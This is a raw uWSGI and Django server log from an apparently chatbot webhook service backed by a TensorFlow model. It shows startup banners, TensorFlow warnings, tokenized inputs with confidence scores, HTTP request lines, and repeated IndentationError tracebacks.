2020-08-28 12:35:25.461674: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['']
['']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
2020-08-28 12:35:29.734225: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:35:30.038468: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:35:30.040252: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:35:30.041650: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
85.09%   .

[pid: 2201|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:35:17 2020] POST /webhook/ => generated 38 bytes in 12460 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
85.09%   .

[pid: 2201|app: 0|req: 2/2] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:35:37 2020] POST /webhook/ => generated 38 bytes in 54 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:36:58 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55a47d65acf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55a47d65acf0 pid: 2294 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2294, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 46
    return welcome(queryText)
    ^
IndentationError: unexpected indent
[pid: 2294|app: 0|req: 1/1] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:37:03 2020] POST /webhook/ => generated 101918 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 46
    return welcome(queryText)
    ^
IndentationError: unexpected indent
[pid: 2294|app: 0|req: 2/2] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 12:41:14 2020] POST /webhook/ => generated 101918 bytes in 63 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:41:28 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x564865dc7cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564865dc7cf0 pid: 2303 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2303, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 46
    return welcome(queryText)
    ^
IndentationError: unexpected indent
[pid: 2303|app: 0|req: 1/1] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:42:17 2020] POST /webhook/ => generated 101918 bytes in 70 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:43:21 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5600c9548cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5600c9548cf0 pid: 2316 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2316, cores: 1)
2020-08-28 12:43:35.208809: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:43:35.208842: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-08-28 12:43:41.658028: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:43:41.658060: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:43:41.658078: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:43:41.658289: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:43:41.683037: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:43:41.683378: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5600ce7089e0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:43:41.683394: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:43:41.970772: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:43:41.972212: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:43:41.973571: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['']
['']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
2020-08-28 12:43:46.261628: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:43:46.570672: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:43:46.572300: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:43:46.573718: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
85.09%   .

[pid: 2316|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:43:34 2020] POST /webhook/ => generated 38 bytes in 11933 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
85.09%   .

[pid: 2316|app: 0|req: 2/2] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:43:56 2020] POST /webhook/ => generated 38 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[4959]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4959]]
80.25%   .

[pid: 2316|app: 0|req: 3/3] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:44:13 2020] POST /webhook/ => generated 38 bytes in 1379 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2316|app: 0|req: 4/4] 192.35.168.251 () {30 vars in 325 bytes} [Fri Aug 28 12:51:52 2020] GET / => generated 1365 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2316|app: 0|req: 5/5] 192.35.168.251 () {36 vars in 456 bytes} [Fri Aug 28 12:51:52 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 05:45:15 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560cdf113cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560cdf113cf0 pid: 8575 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 8575, cores: 1)
2020-09-03 05:45:23.848576: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 05:45:23.848616: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 05:45:32.715949: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 05:45:32.715978: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 05:45:32.715997: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 05:45:32.716212: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 05:45:32.751952: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 05:45:32.752407: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x560ce426b600 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 05:45:32.752426: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 05:45:33.109061: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:45:33.110509: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:45:33.111881: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 8575|app: 0|req: 1/1] 203.249.39.174 () {50 vars in 849 bytes} [Thu Sep  3 05:45:22 2020] GET / => generated 1365 bytes in 10866 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['']
['']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
2020-09-03 05:45:37.465100: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-03 05:45:37.798349: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:45:37.799849: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:45:37.801267: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
85.09%   .

[pid: 8575|app: 0|req: 2/2] 66.249.83.45 () {42 vars in 540 bytes} [Thu Sep  3 05:45:33 2020] POST /webhook/ => generated 38 bytes in 4442 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 8575|app: 0|req: 3/3] 203.249.39.174 () {48 vars in 767 bytes} [Thu Sep  3 05:45:37 2020] GET /favicon.ico => generated 2328 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 8575|app: 0|req: 4/4] 203.249.39.174 () {52 vars in 901 bytes} [Thu Sep  3 05:45:37 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 8575|app: 0|req: 5/5] 203.249.39.174 () {52 vars in 904 bytes} [Thu Sep  3 05:45:37 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['']
['']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
85.09%   .

[pid: 8575|app: 0|req: 6/6] 66.249.83.45 () {42 vars in 540 bytes} [Thu Sep  3 05:46:00 2020] POST /webhook/ => generated 38 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '']
['', '', '', '', '']
[[54, 182, 46, 41, 74]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0  54 182  46  41  74]]
93.06%   .

[pid: 8575|app: 0|req: 7/7] 66.249.83.45 () {42 vars in 542 bytes} [Thu Sep  3 05:47:40 2020] POST /webhook/ => generated 38 bytes in 1191 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[66, 80, 149, 402]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  66  80 149 402]]
62.73%   .

[pid: 8575|app: 0|req: 8/8] 66.249.84.205 () {42 vars in 541 bytes} [Thu Sep  3 05:49:25 2020] POST /webhook/ => generated 39 bytes in 62 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[66, 80, 149, 402]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  66  80 149 402]]
62.73%   .

[pid: 8575|app: 0|req: 9/9] 66.249.83.41 () {42 vars in 540 bytes} [Thu Sep  3 05:49:45 2020] POST /webhook/ => generated 39 bytes in 58 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[66, 80, 149, 402]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  66  80 149 402]]
62.73%   .

[pid: 8575|app: 0|req: 10/10] 66.102.6.203 () {42 vars in 540 bytes} [Thu Sep  3 05:49:48 2020] POST /webhook/ => generated 39 bytes in 53 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[66, 80, 149, 402]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  66  80 149 402]]
62.73%   .

[pid: 8575|app: 0|req: 11/11] 66.249.83.41 () {42 vars in 540 bytes} [Thu Sep  3 05:50:37 2020] POST /webhook/ => generated 39 bytes in 51 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 05:51:05 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56376e23cd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56376e23cd00 pid: 10802 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 10802, cores: 1)
2020-09-03 05:51:19.028868: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 05:51:19.028902: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 05:51:26.161593: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 05:51:26.161624: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 05:51:26.161640: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
